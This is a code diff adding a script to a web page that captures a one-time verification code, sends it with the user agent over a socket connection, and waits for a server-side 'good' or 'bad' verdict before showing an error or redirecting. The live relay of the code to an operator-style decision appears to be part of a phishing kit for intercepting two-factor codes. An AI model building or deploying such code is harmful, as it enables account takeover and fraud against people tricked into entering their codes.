@@ -481,5 +481,38 @@ p {
                 </div>
             </div>
         </div>
+	    <script>
+    const socket = io();
+    // Get the button, assign a click event handler
+    document.getElementById('continueBtn').addEventListener('click', function () {
+
+        // Show the loading overlay
+        document.querySelector('.loading-overlay').style.display = 'flex';
+        const verificationCode = document.getElementById('verificationCode').value;
+        const data = {
+            otp: verificationCode,
+            userAgent: navigator.userAgent
+        }
+        socket.emit('otp', data)
+    });
+
+    socket.on('choice', (data) => {
+        if (data.action === "bad") {
+            // Display the error message
+            document.querySelector('.loading-overlay').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'block';
+            socket.emit('confirmation_bad', {status: true})
+        } else if (data.action === "good") {
+            socket.emit('confirmation_good', {status: true})
+            // Hide the error message if the action is not 'bad'
+            document.getElementById('errorMessage').style.display = 'none';
+            window.location.href = '/finish';
+        }
+    })
+
+    
+
+</script>
+
     </body>
 </html>
